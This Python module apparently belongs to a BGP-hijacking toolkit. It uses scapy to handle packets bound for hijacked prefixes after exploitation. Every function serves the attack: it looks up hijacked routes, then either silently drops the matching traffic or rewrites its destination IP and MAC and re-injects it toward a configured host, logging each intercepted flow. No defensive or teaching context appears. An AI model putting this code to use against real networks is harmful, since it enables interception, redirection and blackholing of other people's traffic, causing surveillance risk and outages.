from scapy.all import send, sendp, IP, TCP, UDP, Ether, getmacbyip
from misc.grab_config import get_config
from misc.get_route import dig_RIB
from misc.logging import handle_log
from scapy.all import getmacbyip


def is_hijacked(dst_ip: str) -> bool:
    """Checks if a destination IP falls within any hijacked prefix in the RIB.

    Performs a longest-prefix match lookup against the local RIB to determine
    if the given destination IP belongs to a prefix that has been hijacked.

    Args:
        dst_ip (str): The destination IP address to check

    Returns:
        bool: True if the IP falls within a hijacked prefix, False otherwise
    """
    result = dig_RIB(dst_ip)
    return result is not None


def get_routing_handler():
    """Builds and returns a packet handler function for post-exploitation routing.

    Reads the routing configuration to determine the mode of operation. In
    blackhole mode, intercepted packets are silently dropped. In forward mode,
    packets are rewritten with a new destination IP and MAC address and
    re-injected onto the network. The handler is intended to be used as a
    callback in the AsyncSniffer.

    Returns:
        function: A packet handler function that intercepts and processes
                  packets destined for hijacked prefixes, or None if the
                  destination MAC address cannot be resolved in forward mode
    """
    config = get_config(["route_dest_ip", "iface"])
    pe_route_dest = config["route_dest_ip"]
    iface = config["iface"]
    is_blackhole = pe_route_dest == "0.0.0.0"

    # get MAC of destination upfront
    dest_mac = getmacbyip(pe_route_dest) if not is_blackhole else None
    if not is_blackhole and dest_mac is None:
        print(f"[x] Could not resolve MAC for {pe_route_dest}")
        return None

    def process_packet(pkt):
        """Processes a single captured packet and applies routing decision.

        Checks if the packet destination falls within a hijacked prefix and
        either blackholes or forwards it depending on the configured mode.

        Args:
            pkt: A scapy packet object captured by the AsyncSniffer
        """
        if IP not in pkt:
            print("[x] No IP Layer, Skipping")
            return

        dst = pkt[IP].dst
        src = pkt[IP].src
        print(f"process_packet called: {src} -> {dst}")

        if not is_hijacked(dst):
            return

        route = dig_RIB(dst)
        prefix = route.get("prefix", dst)

        if is_blackhole:
            print(f"[+] BLACKHOLE: {src} -> {dst} (prefix: {prefix}) — dropped")
            handle_log(f"BLACKHOLE: {src} -> {dst} (prefix: {prefix})", "pe.log")

        else:
            print(f"[+] FORWARD: {src} -> {dst} redirected to {pe_route_dest} (prefix: {prefix})")
            handle_log(f"FORWARD: {src} -> {dst} -> {pe_route_dest} (prefix: {prefix})", "pe.log")

            # rewrite destination
            pkt[IP].dst = pe_route_dest
            del pkt[IP].chksum

            if TCP in pkt:
                del pkt[TCP].chksum
            elif UDP in pkt:
                del pkt[UDP].chksum

            # rewrite ethernet layer with correct MAC
            pkt[Ether].dst = dest_mac
            del pkt[Ether].src

            sendp(pkt, iface=iface, verbose=False)

    return process_packet
